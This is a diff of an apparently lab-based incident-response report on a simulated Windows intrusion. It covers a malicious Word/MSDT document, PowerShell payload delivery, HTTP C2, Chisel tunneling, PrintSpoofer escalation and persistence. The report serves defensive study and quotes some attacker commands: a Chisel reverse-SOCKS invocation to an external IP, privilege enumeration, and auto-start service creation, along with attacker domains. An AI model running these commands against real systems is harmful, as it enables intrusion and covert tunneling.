-The timeline below presents the observed attack progression in investigative order. It is a sequence of activity rather than a timestamp-accurate chronology; exact event times are not included where they could not be reliably established from the preserved evidence.
-
-| Phase | Observed Activity | Supporting Evidence |
+| Phase | Observed activity | Evidence |
 | --- | --- | --- |
-| Initial Execution | Malicious Word document `free_magicules.doc` opened and initiated suspicious child-process activity | Sysmon process events |
-| Exploitation | `WINWORD.EXE` launched `msdt.exe` using PCWDiagnostic parameters and encoded PowerShell | Process creation and command-line telemetry |
-| Payload Delivery | PowerShell retrieved and extracted `update.zip` from `phishteam.xyz` | Decoded PowerShell command |
-| Initial Persistence | `update.lnk` was created in the Windows Startup directory | Sysmon Event ID 11 |
-| Command and Control | Repeated outbound connections and HTTP requests associated with `resolvecyber.xyz` | Sysmon network events and PCAP |
-| C2 Identification | HTTP traffic contained the `Nim httpclient/1.6.6` User-Agent | Brim HTTP analysis |
-| Command Execution | Decoded HTTP content revealed a `whoami` command and account-related activity | HTTP-stream analysis |
-| Credential Discovery | Credential configuration was discovered in `automation.ps1` | PowerShell command output |
-| Service Discovery | The attacker enumerated TCP listening ports using `netstat -ano -p tcp` | Process and command-output evidence |
-| Tunneling | `ch.exe` launched with `client 167.71.199.191:8080 R:socks` | Sysmon process-creation evidence |
-| Privilege Enumeration | `whoami /priv` was executed to inspect available Windows privileges | Process creation |
-| Privilege Escalation | `spf.exe` (PrintSpoofer) was executed with `final.exe` | Process-creation evidence |
-| SYSTEM Access | Decoded command output reported `nt authority\system` | Captured and decoded command output |
-| Account Manipulation | `net.exe` commands attempted account creation and password changes | Process-creation evidence |
-| Account Creation | Windows Security Event ID 4720 confirmed creation of `shion` | Windows Security logs |
-| Privileged Membership | Event ID 4732 confirmed that `shion` was added to Administrators | Windows Security logs |
-| Additional Persistence | `sc.exe` commands requested creation of automatically starting `TempestUpdate` and `TempestUpdate2` services | Process-creation evidence |
-
-### Attack Progression
-
-The attack developed through several connected phases:
-
-**Initial compromise:** A malicious Word document triggered execution through `msdt.exe` and encoded PowerShell.
-
-**Establishing access:** A second-stage payload was retrieved, Startup persistence was configured, and suspicious HTTP communication followed.
-
-**Post-compromise discovery:** The attacker issued commands through the C2 channel, investigated credentials, and enumerated available network services.
-
-**Expanding control:** Chisel was used to initiate a reverse SOCKS tunnel, followed by privilege enumeration and PrintSpoofer execution.
-
-**Privileged persistence:** SYSTEM-level activity was followed by account manipulation, confirmed Administrator-group membership, and attempted installation of automatically starting Windows services.
-
-### Analytical Notes
-
-Several distinctions were maintained during timeline reconstruction:
-
-- A network connection did not automatically establish successful command execution.
-- A file-creation event did not independently prove that the file executed.
-- Privilege enumeration did not, by itself, establish privilege escalation.
-- Process evidence showing service-creation commands did not independently confirm successful service installation.
-- Windows Security events were used to validate account-management outcomes where available.
-
-These distinctions ensured that the timeline represented what the preserved evidence could establish rather than assuming every attacker command succeeded.
+| Initial execution | `free_magicules.doc` associated with Word → MSDT → encoded PowerShell | Figures 1–2 |
+| Payload delivery | Download and extraction of `update.zip` from `phishteam.xyz` | Figure 3 |
+| Initial persistence | Creation of `update.lnk` in Startup | Figure 4 |
+| C2 | Repeated outbound connections and HTTP activity to `resolvecyber.xyz` | Figures 5–6 |
+| Post-compromise commands | Decoded `whoami` and account-related content | Figure 7 |
+| Discovery | Credential-bearing script and TCP listening-port enumeration | Figures 8–9 |
+| Tunneling | Chisel reverse SOCKS client invoked | Figure 10 |
+| Escalation | `whoami /priv` and PrintSpoofer-associated execution | Figures 11–12 |
+| Elevated execution | Decoded output reporting SYSTEM identity | Figure 13 |
+| Account changes | Account-modification commands; confirmed `shion` creation and Administrators membership | Figures 14–16 |
+| Service persistence attempt | Automatic-service creation commands referencing `final.exe` | Figure 17 |
 
 ## Key Findings
 
-The investigation identified a multi-stage Windows intrusion involving malicious document execution, command-and-control communication, credential discovery, network tunneling, privilege escalation, and multiple persistence mechanisms.
-
-### 1. Malicious Document Execution
-
-A Microsoft Word document, `free_magicules.doc`, initiated a suspicious execution chain involving `WINWORD.EXE`, `msdt.exe`, and encoded PowerShell.
-
-Process telemetry connected the document to subsequent attacker-controlled execution, providing stronger evidence than the presence of a suspicious document alone.
-
-### 2. Second-Stage Payload Delivery and Persistence
-
-Decoded PowerShell revealed the retrieval and extraction of `update.zip` from `phishteam.xyz`.
-
-Sysmon Event ID 11 subsequently recorded creation of `update.lnk` inside the Windows Startup directory, establishing a mechanism for execution at user logon.
-
-### 3. HTTP-Based Command and Control
-
-Network analysis identified repeated communication associated with `resolvecyber.xyz` and the unusual User-Agent `Nim httpclient/1.6.6`.
-
-Captured HTTP content also revealed encoded commands, including `whoami`, allowing network activity to be connected with post-compromise execution.
-
-### 4. Credential Discovery and Network Reconnaissance
-
-PowerShell output exposed embedded authentication material within `automation.ps1`.
-
-The attacker also executed `netstat -ano -p tcp` to enumerate listening services and their associated process IDs.
-
-These findings indicated that the attacker was gathering information useful for additional access.
-
-### 5. Reverse SOCKS Tunneling
-
-Sysmon process telemetry identified `ch.exe` executing a Chisel client with reverse SOCKS parameters:
-
-`client 167.71.199.191:8080 R:socks`
-
-This established evidence of attempted reverse tunneling through the compromised endpoint.
-
-The available screenshot did not independently prove that the tunnel successfully carried subsequent internal traffic.
-
-### 6. Privilege Escalation to SYSTEM
-
-Privilege enumeration using `whoami /priv` was followed by PrintSpoofer-related execution involving `spf.exe` and `final.exe`.
-
-Decoded command output subsequently reported `nt authority\system`, supporting the assessment that attacker-controlled execution reached the SYSTEM security context.
-
-### 7. Privileged Account Persistence
-
-Process evidence identified account-creation and modification commands targeting `shion` and `shuna`.
-
-Windows Security Event ID `4720` independently confirmed creation of `shion`, while Event ID `4732` confirmed that the account was added to the built-in Administrators group.
-
-These changes provided an additional potential access mechanism independent of the original malicious document.
-
-### 8. Windows Service Persistence Attempts
-
-Process evidence showed `sc.exe` commands requesting creation of two automatically starting services:
-
-- `TempestUpdate`
-- `TempestUpdate2`
-
-Both referenced `C:\ProgramData\final.exe`.
-
-The commands established an attempt to configure durable execution, although the preserved evidence did not independently confirm successful service installation.
-
----
+1. **Document-triggered execution:** A suspicious Word/MSDT/PowerShell process chain initiated the observed intrusion.
+2. **Payload delivery and Startup persistence:** Decoded script content showed `update.zip` retrieval, while Sysmon independently recorded `update.lnk` creation in Startup.
+3. **HTTP C2:** Network artifacts revealed repeated external communication and encoded command content associated with `resolvecyber.xyz`.
+4. **Discovery and credential exposure:** Investigative artifacts showed service enumeration and recoverable authentication material in `automation.ps1`.
+5. **Tunneling attempt:** Chisel ran with reverse SOCKS arguments, but successful relay of internal traffic was not verified.
+6. **SYSTEM-level activity:** PrintSpoofer-associated execution preceded decoded output reporting the SYSTEM identity.
+7. **Privileged account persistence:** Security events confirmed `shion` creation and addition to Administrators; `shuna` was referenced in commands but its resulting state was not fully verified.
+8. **Service-based persistence attempt:** `sc.exe` commands requested two auto-start services; installation and startup were not confirmed.
 
 ## Investigation Indicators
 
-The following indicators were identified from the preserved forensic evidence. They are specific to the simulated intrusion and should be interpreted in the context of the surrounding process, account, and network activity.
+These are **case-specific investigative leads**, not universally malicious signatures.
 
-### Network Indicators
+### Network
 
-| Indicator | Context |
+| Indicator | Significance |
 | --- | --- |
-| `phishteam.xyz` | Infrastructure associated with second-stage payload delivery |
-| `resolvecyber.xyz` | Domain associated with suspicious HTTP/C2 activity |
-| `167.71.222.162` | Destination observed in repeated Sysmon network connections |
-| `167.71.199.191:8080` | Chisel reverse SOCKS server destination |
-| `Nim httpclient/1.6.6` | HTTP User-Agent observed during suspicious communication |
+| `phishteam.xyz` | Second-stage archive delivery |
+| `resolvecyber.xyz` | Suspicious HTTP/C2 communications |
+| `167.71.222.162` | Destination in repeated Sysmon connections |
+| `167.71.199.191:8080` | Remote destination in Chisel command |
+| `Nim httpclient/1.6.6` | HTTP User-Agent associated with suspect requests |
 
-### Files and Executables
+### Files, processes, and accounts
 
-| Indicator | Context |
+| Indicator | Significance |
 | --- | --- |
-| `free_magicules.doc` | Malicious Word document associated with initial execution |
-| `update.zip` | Archive retrieved through decoded PowerShell |
-| `update.lnk` | Shortcut created in the Windows Startup directory |
-| `automation.ps1` | PowerShell script containing embedded domain credential material |
-| `first.exe` | Attacker-associated executable that spawned Chisel |
-| `ch.exe` | Chisel client used for reverse SOCKS tunneling |
-| `spf.exe` | PrintSpoofer executable used during privilege-escalation activity |
-| `final.exe` | Payload involved in SYSTEM-level execution and service-creation commands |
+| `free_magicules.doc` | Initial malicious document |
+| `update.zip` / `update.lnk` | Downloaded archive / Startup artifact |
+| `automation.ps1` | Script exposing credential material |
+| `first.exe` / `ch.exe` | Parent executable / Chisel client |
+| `spf.exe` / `final.exe` | PrintSpoofer-associated execution / payload |
+| `TEMPEST\benimaru` | Domain identity referenced in recovered script material |
+| `shion` | Confirmed created account and Administrators member |
+| `shuna` | Account targeted by observed commands |
+| `TempestUpdate` / `TempestUpdate2` | Service names in attempted installation commands |
+| `C:\ProgramData\final.exe` | Executable specified in service-creation commands |
 
-### Accounts and Security Contexts
+### Relevant telemetry
 
-| Indicator | Context |
+| Source / Event ID | Detection value |
 | --- | --- |
-| `TEMPEST\benimaru` | Domain account referenced in discovered credential configuration |
-| `shion` | Local account whose creation and Administrators membership were confirmed |
-| `shuna` | Local account targeted by account-management commands |
-| `NT AUTHORITY\SYSTEM` | Privileged security context reported in decoded command output |
-
-### Windows Event Indicators
-
-| Event ID / Source | Investigative Value |
-| --- | --- |
-| Sysmon Event ID 1 | Process creation, command-line activity, and parent-child relationships |
-| Sysmon Event ID 3 | Network connection activity |
-| Sysmon Event ID 11 | File creation, including the Startup shortcut |
-| Security Event ID 4720 | Local account creation |
-| Security Event ID 4722 | Account enablement |
-| Security Event ID 4724 | Password-reset activity |
-| Security Event ID 4738 | Account-property changes |
-| Security Event ID 4732 | Addition of an account to a security-enabled local group |
-
-### Persistence Artifacts
-
-| Artifact | Significance |
-| --- | --- |
-| `update.lnk` in the Windows Startup directory | Logon-based persistence |
-| `shion` in the local Administrators group | Potential persistent privileged account access |
-| `TempestUpdate` | Attempted automatic Windows service persistence |
-| `TempestUpdate2` | Additional attempted automatic Windows service persistence |
-| `C:\ProgramData\final.exe` | Executable referenced by service-creation commands |
-
-### Analyst Note
-
-These indicators should not be treated as universally malicious outside the context of this investigation.
-
-Utilities such as `certutil.exe`, PowerShell, `net.exe`, `sc.exe`, and `whoami.exe` have legitimate administrative uses. Their significance depends on how they were executed, their parent processes, associated network destinations, and their relationship to the broader intrusion.
-
-Likewise, observing a file, command, or network connection does not automatically establish that every subsequent attacker objective succeeded.
+| Sysmon 1 | Process creation, command line, process ancestry |
+| Sysmon 3 | Network connections, if enabled |
+| Sysmon 11 | File creation, including Startup artifact |
+| Security 4720 | Account creation |
+| Security 4732 | Local security-enabled group membership change |
+| Security 4722 / 4724 / 4738 | Account enablement / password-reset attempt / account change |
+| System 7045 | Service installation confirmation **if collected**; not part of the verified evidence here |
 
 ## MITRE ATT&CK Mapping
 
-The Tempest investigation identified attacker behaviors spanning execution, persistence, discovery, credential access, command and control, privilege escalation, and account manipulation.
+Mappings describe behaviors supported by the preserved artifacts. They are not assertions that every attempted technique succeeded.
 
-The following techniques were mapped to the preserved Sysmon telemetry, Windows Security events, decoded command content, and network evidence.
-
-| Tactic | ATT&CK Technique | ID | Supporting Evidence |
+| Tactic | Technique | ID | Supporting observation |
 | --- | --- | --- | --- |
-| Execution | Command and Scripting Interpreter: PowerShell | `T1059.001` | Encoded PowerShell execution following the malicious Word/MSDT process chain |
-| Command and Control | Ingress Tool Transfer | `T1105` | PowerShell retrieval of `update.zip` from external infrastructure |
-| Persistence | Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | `T1547.001` | Sysmon Event ID 11 recording creation of `update.lnk` in the Windows Startup directory |
-| Command and Control | Application Layer Protocol: Web Protocols | `T1071.001` | HTTP traffic to `resolvecyber.xyz` associated with suspicious C2 activity |
-| Discovery | System Owner/User Discovery | `T1033` | Decoded C2 command containing `whoami` |
-| Discovery | Network Service Discovery | `T1046` | Execution of `netstat -ano -p tcp` to enumerate listening services and ports |
-| Credential Access | Unsecured Credentials: Credentials in Files | `T1552.001` | Embedded domain authentication material identified in `automation.ps1` |
-| Command and Control | Proxy | `T1090` | Chisel client launched with reverse SOCKS parameters |
-| Privilege Escalation | Exploitation for Privilege Escalation | `T1068` | PrintSpoofer-associated execution followed by decoded output reporting `NT AUTHORITY\SYSTEM` |
-| Persistence | Create Account: Local Account | `T1136.001` | Windows Security Event ID 4720 confirming creation of `shion` |
-| Persistence / Privilege Escalation | Account Manipulation: Additional Local or Domain Groups | `T1098.007` | Event ID 4732 confirming addition of `shion` to the local Administrators group |
-| Persistence | Create or Modify System Process: Windows Service | `T1543.003` | `sc.exe` commands requesting creation of `TempestUpdate` and `TempestUpdate2` services with automatic startup |
+| Execution | Command and Scripting Interpreter: PowerShell | `T1059.001` | Encoded PowerShell after Word/MSDT activity |
+| Command and Control | Ingress Tool Transfer | `T1105` | External retrieval of `update.zip` |
+| Persistence | Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | `T1547.001` | Startup `update.lnk` creation |
+| Command and Control | Application Layer Protocol: Web Protocols | `T1071.001` | Suspicious HTTP C2 traffic |
+| Discovery | System Owner/User Discovery | `T1033` | Decoded `whoami` command |
+| Discovery | System Network Connections Discovery | `T1049` | `netstat -ano -p tcp` enumeration of listening TCP endpoints |
+| Credential Access | Unsecured Credentials: Credentials in Files | `T1552.001` | Credential configuration in `automation.ps1` |
+| Command and Control | Proxy | `T1090` | Chisel `R:socks` invocation (attempted) |
+| Privilege Escalation | Exploitation for Privilege Escalation | `T1068` | PrintSpoofer-associated execution and later SYSTEM output; exact mechanism not independently validated |
+| Persistence | Create Account: Local Account | `T1136.001` | Confirmed creation of `shion` |
+| Persistence / Privilege Escalation | Account Manipulation: Additional Local or Domain Groups | `T1098.007` | Confirmed addition to local Administrators |
+| Persistence | Create or Modify System Process: Windows Service | `T1543.003` | Attempted creation of two auto-start services |
 
-### Evidence and Mapping Considerations
-
-**Initial execution:** The observed `WINWORD.EXE` → `msdt.exe` → PowerShell chain established suspicious document-triggered execution. The mapping emphasizes the confirmed PowerShell behavior without assigning additional exploitation techniques unsupported by the preserved artifacts.
-
-**Tunneling:** Chisel was launched with reverse SOCKS parameters, supporting the Proxy technique. The available process evidence does not independently confirm that the tunnel successfully relayed subsequent internal traffic.
-
-**Privilege escalation:** PrintSpoofer execution and later SYSTEM identity output support the escalation assessment. The exact operating-system vulnerability or privilege-abuse mechanism was not independently reconstructed, so the mapping should not be interpreted as proof of a particular CVE.
-
-**Account persistence:** Account creation and Administrator-group membership were confirmed through Windows Security events. The Windows service mapping describes observed service-creation commands, not verified installation or successful startup.
-
-These mappings represent investigative classifications of the activity observed in the simulated environment. They do not imply that every attacker objective succeeded or that the listed techniques are malicious in every context.
+**Mapping caution:** The `netstat` behavior supports system network connection discovery (`T1049`) more directly than active network service scanning. The Chisel and service rows reflect observed commands, not verified operational outcomes. PrintSpoofer attribution follows the preserved investigation; no specific CVE is asserted.
 
 ## Detection Opportunities
 
-The reconstructed intrusion exposed several opportunities to identify malicious activity before the attacker reached SYSTEM-level access and established multiple persistence mechanisms.
+| Detection idea | Correlation or signal | Recommended telemetry |
+| --- | --- | --- |
+| Office-to-utility execution | Office process followed by `msdt.exe` and encoded PowerShell | Sysmon 1; Windows process creation; PowerShell logs |
+| Startup artifact creation | Scripted external download followed by a new `.lnk` in Startup | Sysmon 1 and 11; file monitoring |
+| Suspicious HTTP C2 | Unexpected client, repeated requests, encoded content, suspicious process ancestry | HTTP proxy/PCAP, DNS, Sysmon 3 |
+| Credential discovery | Unusual process or command access to scripts containing hardcoded secrets | PowerShell logs; process and file-access telemetry where enabled |
+| Unauthorized tunneling | `ch.exe`, `R:socks`, external endpoint, suspicious parent process | Sysmon 1 and 3; network flow |
+| Privilege escalation sequence | `whoami /priv` followed by exploit-related execution and SYSTEM-context processes | Sysmon 1; endpoint detection and response |
+| New privileged account | Security 4720 followed by 4732 for the same local identity | Centralized Windows Security logs |
+| Suspicious service installation | `sc.exe create` with `start= auto` and unexpected executable path; confirm with 7045 | Sysmon 1; Windows System 7045 |
 
-The following detection opportunities focus on observable behaviors and event correlations rather than relying exclusively on file names or known indicators.
-
-### Suspicious Office Process Execution
-
-The initial attack involved Microsoft Word spawning `msdt.exe` and encoded PowerShell.
-
-**Potential detection logic:**
-- Detect Office applications launching diagnostic utilities or scripting interpreters.
-- Correlate `WINWORD.EXE` activity with subsequent PowerShell execution.
-- Alert on unusual parent-child process relationships involving document applications.
-- Investigate encoded PowerShell launched shortly after Office document execution.
-
-**Relevant telemetry:** Sysmon Event ID 1, process-creation logs, and command-line arguments.
-
-This would provide an opportunity to detect the intrusion near its initial execution stage.
-
-### Payload Retrieval and Startup Persistence
-
-The attacker retrieved `update.zip` and created `update.lnk` in the Windows Startup directory.
-
-**Potential detection logic:**
-- Monitor scripting interpreters retrieving external archives.
-- Detect new shortcut or executable files created in user Startup directories.
-- Correlate file creation with preceding suspicious Office or PowerShell execution.
-- Identify unexpected changes to logon persistence locations.
-
-**Relevant telemetry:** Sysmon Event IDs 1 and 11, file-creation records, and PowerShell activity.
-
-### Suspicious HTTP Command and Control
-
-The investigation identified HTTP communication involving `resolvecyber.xyz` and the `Nim httpclient/1.6.6` User-Agent.
-
-**Potential detection logic:**
-- Alert on unusual HTTP clients communicating with unrecognized external infrastructure.
-- Identify periodic outbound requests from unexpected processes.
-- Correlate suspicious network connections with known malicious process ancestry.
-- Hunt for repeated HTTP requests containing unusual encoded query parameters.
-
-**Relevant telemetry:** Sysmon Event ID 3, HTTP proxy logs, and packet-capture evidence.
-
-The User-Agent alone is not proof of compromise because it is client-controlled and can be spoofed.
-
-### Credential Exposure and Discovery
-
-The attacker discovered authentication material in `automation.ps1` and enumerated local services.
-
-**Potential detection logic:**
-- Identify suspicious processes searching script files for passwords or authentication variables.
-- Monitor access to files known to contain sensitive application credentials.
-- Correlate credential discovery with subsequent authentication or remote-access activity.
-- Detect service enumeration performed by processes associated with earlier malicious execution.
-
-**Relevant telemetry:** Process-creation records, command-line activity, PowerShell logging, and file-access auditing where configured.
-
-### Reverse SOCKS Tunneling
-
-Chisel was launched with reverse SOCKS parameters and an external destination.
-
-**Potential detection logic:**
-- Detect Chisel-related command-line patterns such as `R:socks`.
-- Alert on unauthorized tunneling utilities running from user-writable locations.
-- Correlate suspicious process execution with outbound connections to uncommon destinations.
-- Investigate tunneling processes spawned by previously identified attacker-controlled executables.
-
-**Relevant telemetry:** Sysmon Event IDs 1 and 3, DNS logs, and network-flow data.
-
-This detection should distinguish the attempt to establish a tunnel from verified successful use of that tunnel.
-
-### Privilege Escalation
-
-The investigation identified privilege enumeration followed by PrintSpoofer activity and SYSTEM-level execution.
-
-**Potential detection logic:**
-- Correlate `whoami /priv` with subsequent suspicious process execution.
-- Detect known PrintSpoofer-related executables or command patterns.
-- Identify unexpected transitions into SYSTEM-level execution.
-- Correlate privilege enumeration, exploit-tool execution, and identity-verification commands.
-
-**Relevant telemetry:** Sysmon Event ID 1, Windows process logs, and endpoint security telemetry.
-
-Privilege enumeration alone is not malicious; the sequence and execution context provide the stronger signal.
-
-### Local Account and Administrator Group Manipulation
-
-Windows Security events confirmed creation of `shion` and addition of that account to Administrators.
-
-**Potential detection logic:**
-- Alert on unexpected local account creation.
-- Correlate account creation with subsequent privileged-group membership changes.
-- Monitor password-reset or account-modification activity involving privileged accounts.
-- Prioritize account-management changes occurring shortly after confirmed malicious execution.
-
-**Relevant telemetry:** Windows Security Event IDs 4720, 4722, 4724, 4738, and 4732.
-
-A particularly useful correlation would identify a newly created local account that is added to Administrators within a short period.
-
-### Windows Service Persistence
-
-The attacker executed `sc.exe` commands requesting creation of automatically starting services referencing `final.exe`.
-
-**Potential detection logic:**
-- Monitor service-creation commands and newly installed Windows services.
-- Flag services whose executable paths point to user-writable or unusual directories.
-- Correlate service creation with earlier privilege escalation or suspicious process activity.
-- Investigate newly created automatically starting services outside approved deployment activity.
-
-**Relevant telemetry:** Sysmon Event ID 1, Windows System Event ID 7045 where available, and service-configuration auditing.
-
-The preserved evidence established service-creation attempts. Additional service-installation telemetry would be needed to confirm successful installation.
-
----
+**Priority correlation:** New local account creation followed shortly by addition of the same identity to Administrators is a comparatively strong, actionable signal. Pair it with host context and change-management records to reduce false positives.
 
 ## Remediation Recommendations
 
-The following recommendations address the attack paths identified during the Tempest investigation. They represent defensive actions appropriate to the simulated compromise rather than remediation steps performed during the investigation.
+These are recommended actions for a comparable incident, **not changes performed in this simulation**.
 
-### Harden Document Execution
-
-- Keep Microsoft Office and Windows components updated.
-- Restrict unnecessary Office child-process execution using appropriate attack-surface-reduction controls.
-- Block or investigate unexpected diagnostic-tool execution from Office applications.
-- Use email filtering and attachment controls to reduce exposure to malicious documents.
-
-### Restrict Script and Payload Execution
-
-- Apply application-control policies where operationally feasible.
-- Restrict unapproved executables from user-writable directories.
-- Monitor suspicious PowerShell activity and enable appropriate script-logging capabilities.
-- Review and control the use of legitimate Windows utilities for external downloads.
-
-### Protect Persistence Locations
-
-- Monitor user and system Startup folders for unexpected changes.
-- Review newly created shortcuts, scheduled tasks, services, and autorun configurations.
-- Restrict unnecessary privileges that allow users or applications to create persistent execution mechanisms.
-- Investigate persistence changes associated with suspicious process chains.
-
-### Reduce Command-and-Control Opportunities
-
-- Restrict unnecessary outbound connectivity.
-- Use DNS and web filtering to block identified malicious infrastructure.
-- Monitor unusual HTTP clients and connections to unrecognized destinations.
-- Detect unauthorized tunneling tools and suspicious reverse-proxy configurations.
-
-Blocking individual domains is useful for containment, but behavioral monitoring is necessary because attacker infrastructure can change.
-
-### Protect Credentials and Authentication Material
-
-The discovery of plaintext credential material in `automation.ps1` demonstrated a preventable credential-exposure risk.
-
-Recommended controls include:
-
-- Remove hardcoded passwords from scripts.
-- Store application secrets in approved secret-management systems.
-- Rotate credentials exposed during a suspected compromise.
-- Restrict access to scripts and configuration files containing authentication material.
-- Review the privileges granted to automation and service accounts.
-
-### Reduce Privilege-Escalation Risk
-
-- Keep Windows systems patched against known local privilege-escalation vulnerabilities.
-- Review which accounts and services require `SeImpersonatePrivilege`.
-- Restrict unnecessary local administrative access.
-- Monitor suspicious privilege enumeration and privilege-escalation tooling.
-- Use endpoint protection capable of identifying exploit-related process behavior.
-
-### Review Unauthorized Accounts and Services
-
-Following a confirmed compromise, the incident-response team should:
-
-1. Identify accounts created or modified during the intrusion.
-2. Disable or remove unauthorized accounts after preserving necessary forensic evidence.
-3. Review privileged-group membership.
-4. Reset potentially compromised credentials.
-5. Investigate suspicious service configurations and remove confirmed malicious persistence after evidence preservation.
-6. Verify that persistence mechanisms have not been re-established.
-
-### Validate Recovery and Improve Monitoring
-
-Recovery should include more than terminating the original malicious processes.
-
-The affected endpoint should be examined for additional persistence, compromised credentials, suspicious services, and unauthorized accounts.
-
-If the integrity of the system cannot be established with sufficient confidence, rebuilding from a trusted image may be preferable to relying on partial cleanup.
-
-Centralizing Sysmon, Windows Security, PowerShell, and network telemetry would also support earlier detection and faster correlation of similar activity.
-
+1. **Contain and preserve evidence.** Isolate the affected endpoint as appropriate; collect volatile information and relevant logs before removing attacker artifacts.
+2. **Harden document execution.** Patch Office and Windows; use appropriate attack-surface-reduction rules to prevent unexpected Office child processes and diagnostic-tool abuse.
+3. **Reduce unapproved execution.** Apply application control where feasible; monitor encoded PowerShell and downloads into user-writable paths.
+4. **Remove persistence safely.** Investigate Startup shortcuts, unauthorized accounts, privileged group changes, and suspect services; preserve forensic evidence before cleanup.
+5. **Rotate exposed credentials.** Remove hardcoded secrets from `automation.ps1`-like scripts, rotate affected credentials, and use an approved secrets manager.
+6. **Restrict C2 and tunneling opportunities.** Enforce appropriate egress controls, DNS/web filtering, and detection for unapproved proxy/tunnel tools.
+7. **Review privilege exposure.** Apply security updates, reduce unnecessary local administrator access, and assess service accounts with impersonation privileges.
+8. **Validate recovery.** Review for additional footholds and credential misuse. If endpoint integrity cannot be established, consider rebuilding from a trusted image.
+9. **Improve detection coverage.** Centralize process, network, PowerShell, Security, and service-installation logs; validate the proposed account and service correlation rules.
 
 ## Evidence Limitations
 
-This investigation was reconstructed from preserved Sysmon events, Windows Security logs, decoded command content, and network packet captures collected within a simulated incident-response environment.
-
-Although these sources provided substantial visibility into the intrusion, they did not establish every attacker action or outcome with equal certainty.
-
-The investigation distinguishes between **directly observed events**, **correlated findings**, and **conclusions requiring additional evidence**.
-
-### Initial Execution and Persistence
-
-Process telemetry established the suspicious Word-to-MSDT execution chain, while decoded PowerShell revealed the second-stage payload retrieval.
-
-Sysmon Event ID 11 confirmed creation of `update.lnk` in the Windows Startup directory. However, the file-creation event alone did not establish that the shortcut subsequently executed during a user logon.
-
-### Command and Control
-
-Network evidence identified repeated HTTP communication associated with `resolvecyber.xyz` and the `Nim httpclient/1.6.6` User-Agent.
-
-Decoded HTTP content exposed attacker command activity, but not every request or response was independently tied to a corresponding endpoint process event.
-
-The identified infrastructure and communication pattern supported the C2 assessment without proving every command's execution or outcome.
-
-### Reconnaissance and Credential Discovery
-
-Command evidence showed local service enumeration and discovery of credentials embedded in `automation.ps1`.
-
-The credential material was exposed in the preserved script output, but the investigation did not independently establish every subsequent use of those credentials.
-
-### Reverse SOCKS Tunneling
-
-Sysmon confirmed that `ch.exe` executed with Chisel reverse SOCKS parameters.
-
-The available process evidence did not independently verify that the tunnel was successfully established or that specific internal connections were routed through it.
-
-### Privilege Escalation
-
-Process telemetry showed privilege enumeration and PrintSpoofer execution. Decoded command output subsequently reported `nt authority\system`.
-
-Together, these artifacts supported the assessment that attacker-controlled execution reached the SYSTEM security context.
-
-However, the precise privilege-escalation mechanism was not fully reconstructed from low-level exploit telemetry.
-
-### Account and Service Persistence
-
-Windows Security Event IDs 4720 and 4732 confirmed creation of `shion` and its addition to the built-in Administrators group.
-
-Additional process evidence showed account-management commands involving `shuna`, but the preserved screenshots did not independently confirm every resulting account state.
-
-Similarly, `sc.exe` commands requested creation of `TempestUpdate` and `TempestUpdate2` with automatic startup. The available evidence did not independently confirm successful installation, startup, or subsequent execution of those services.
-
-### Analytical Standard
-
-Throughout the investigation, observed commands were not automatically treated as successful actions.
-
-Where evidence confirmed an attempted technique but not its outcome, that distinction was preserved. Conclusions were limited to the artifacts available rather than assumptions about what the attacker intended or achieved.
-
----
+- **Sequence, not precise timestamps:** The reconstructed timeline follows the supported investigative progression; a timestamp-accurate reconstruction was not available in the selected evidence.
+- **Startup persistence:** Sysmon confirmed `update.lnk` creation; a subsequent successful logon-triggered execution was not independently shown.
+- **C2:** Decoded instructions and HTTP traffic supported the C2 assessment, but not every message was matched to a successful endpoint command.
+- **Credential exposure:** `automation.ps1` exposed credential material; subsequent use of that credential was not independently proven.
+- **Reverse SOCKS:** Chisel process arguments showed an attempted tunnel; successful connection and internal traffic relay were not established.
+- **Privilege escalation:** Tool execution and reported SYSTEM identity supported escalation; low-level exploit mechanics were not reconstructed.
+- **Account activity:** Events confirmed `shion` creation and Administrators membership. Commands involving `shuna` and password changes do not independently prove all resulting account states.
+- **Service persistence:** `sc.exe` creation commands were observed, but the selected evidence did not include independent verification of service installation or startup.
+- **Credential hygiene:** Published screenshots must have all plaintext passwords and any other reusable secrets irreversibly redacted before commit.
 
 ## Skills Demonstrated
 
-**Digital Forensics and Incident Response**  
-Intrusion reconstruction · attack sequencing · cross-source correlation · evidence validation · forensic reporting
+- **Endpoint forensics:** Sysmon process ancestry, file creation, Windows Security event correlation, command-line reconstruction.
+- **Network investigation:** Wireshark/Brim HTTP analysis, C2 indicators, User-Agent review, encoded command interpretation.
+- **Intrusion analysis:** Office/MSDT/PowerShell execution, credential exposure, Chisel tunneling, PrintSpoofer-associated escalation, persistence mechanisms.
+- **SOC analysis:** Evidence-based attack timeline, ATT&CK mapping, detection engineering opportunities, scoped conclusions, remediation planning.
 
-**Windows Endpoint Investigation**  
-Sysmon · Windows Security events · process trees · command-line analysis · file-creation analysis · account-management auditing
+---
 
-**Network and C2 Analysis**  
-Wireshark · Brim · HTTP traffic analysis · User-Agent analysis · command decoding · network IOC identification
-
-**Threat Investigation**  
-Malicious document execution · PowerShell abuse · credential discovery · Chisel tunneling · PrintSpoofer activity · privilege escalation
-
-**Persistence Analysis**  
-Windows Startup folders · local account creation · privileged group membership · Windows service-creation attempts
-
-**Detection and Response**  
-MITRE ATT&CK mapping · behavioral detection opportunities · incident timeline reconstruction · remediation planning · evidence-scoped conclusions
+*This report documents analysis of a simulated intrusion using preserved training artifacts. It is an investigative case study, not a record of actions performed against a live target.*
